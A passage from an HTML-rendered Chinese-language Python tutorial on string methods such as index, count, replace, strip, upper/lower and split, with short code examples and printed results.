operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>index</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>跟find<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>方法一样，只不过如果<span class=\"token builtin\">str</span>不在 mystr中会报一个异常<span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>demo <span class=\"token operator\">=</span> mystr<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token keyword\">and</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>demo<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>结果：</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  File <span class=\"token string\">\"D:/python基础/基础/dome.py\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    demo <span class=\"token operator\">=</span> mystr<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">\"and\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>ValueError<span class=\"token punctuation\">:</span> substring <span class=\"token keyword\">not</span> found</pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rindex</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>类似于 index<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>，不过是从右边开始</pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>count</pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>返回 <span class=\"token builtin\">str</span>在start和end之间 在 mystr里面出现的次数</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>mystr <span class=\"token operator\">=</span> <span class=\"token string\">'hello world itcast and itcastcpp'</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>demo <span class=\"token operator\">=</span> mystr<span class=\"token punctuation\">.</span>count<span class=\"token punctuation\">(</span><span class=\"token string\">\"t\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>demo<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>结果<span class=\"token punctuation\">:</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token number\">4</span><span class=\"token punctuation\">,</span>replace</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>把 mystr 中的 str1 替换成 str2<span class=\"token punctuation\">,</span>如果 count 指定，则替换不超过 count 次<span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>str01 <span class=\"token operator\">=</span> <span class=\"token string\">'hello world xiaoming and xiaoming'</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\"># 把字符串 str01 里的 xiaoming 变成 xiaohong, 最后结果赋值给 str02</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>str02 <span class=\"token operator\">=</span> str01<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'xiaoming'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'xiaohong'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token comment\"># 注意 原字符串 str01 是不变的</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>str01<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># hello world xiaoming and xiaoming</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>str02<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># hello world xiaohong and xiaohong</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>str01 <span class=\"token operator\">=</span> <span class=\"token string\">'hello world xiaoming and xiaoming'</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token comment\"># 1 代表如果 str01 有多个匹配的值，那么替换一次，可以根据需求指定次数，如果不写默认值是 - 1，全部都替换</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>str02 <span class=\"token operator\">=</span> str01<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'xiaoming'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'xiaohong'</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>str01<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># hello world xiaoming and xiaoming</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>str02<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># hello world xiaohong and xiaoming\\</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token number\">5</span><span class=\"token punctuation\">,</span>strip</pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>a<span class=\"token operator\">=</span><span class=\"token string\">'   aBc   '</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>b<span class=\"token operator\">=</span>a<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>strip去除两边空格</pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>rstrip</pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token comment\"># rstrip 去除右边空格</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>a<span class=\"token operator\">=</span><span class=\"token string\">'   aBc   '</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>b<span class=\"token operator\">=</span>a<span class=\"token punctuation\">.</span>rstrip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre></pre></td></tr><tr><td data-num=\"78\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span>lstrip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>lstrip去除左边空格</pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>lower把所有变成小写</pre></td></tr><tr><td data-num=\"84\"></td><td><pre><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span>upper<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>转换大写</pre></td></tr><tr><td data-num=\"86\"></td><td><pre></pre></td></tr><tr><td data-num=\"87\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">'ab'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre><span class=\"token comment\"># startswith 判断是否是这个开头是返回 true 不是返回 false</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre><span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span>endswith<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>endswith以什么结尾</pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre><span class=\"token number\">10</span><span class=\"token punctuation\">,</span>split</pre></td></tr><tr><td data-num=\"95\"></td><td><pre>以 seq为分隔符对字符串mystr分隔，如果 maxsplit有指定值，则仅分隔 maxsplit 个子字符</pre></td></tr><tr><td data-num=\"96\"></td><td><pre>串<span class=\"token punctuation\">,</span> 最后的结果存放到列表里</pre></td></tr><tr><td data-num=\"97\"></td><td><pre>mystr<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span>seq<span class=\"token punctuation\">,</span> maxsplit<span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"98\"></td><td><pre></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>str01 <span class=\"token operator\">=</span> <span class=\"token string\">'2018-01-01'</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre><span class=\"token comment\"># 用指定字符串 把 str01 拆分成多个数据，存放到一个数组里</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>list01 <span class=\"token operator\">=</span> str01<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'-'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre><span class=\"token comment\"># 注意原字符串 str01 不会改变</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>str01<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 2018-01-01</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list01<span class=\"token punctuation\">)</span> <span class=\"token comment\"># ['2018', '01', '01']</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>str01 <span class=\"token operator\">=</span> <span class=\"token string\">'hello ha ha he he   world\\t python'</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>list01 <span class=\"token operator\">=</span> str01<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"108\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list01<span class=\"token punctuation\">)</span> <span class=\"token comment\"># ['hello', 'ha', 'ha', 'he', 'he', 'world', 'python']</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre></pre></td></tr><tr><td data-num=\"110\"></td><td><pre></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>注意如果分隔符在字符串左侧或者右侧，结果会多出空字符串，效果如下</pre></td></tr><tr><td data-num=\"112\"></td><td><pre>str01 <span class=\"token operator\">=</span> <span class=\"token string\">'hello ha ha he he'</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>list01 <span class=\"token operator\">=</span> str01<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'he'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list01<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># ['', 'llo ha ha ', ' ', '']</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>可以指定分隔的次数 如下</pre></td></tr><tr><td data-num=\"117\"></td><td><pre>str01 <span class=\"token operator\">=</span> <span class=\"token string\">'2018-01-02-03-04'</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre><span class=\"token comment\"># 只分隔前两次的分隔符</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>list01 <span class=\"token operator\">=</span> str01<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'-'</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list01<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># ['2018', '01', '02-03-04']</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span 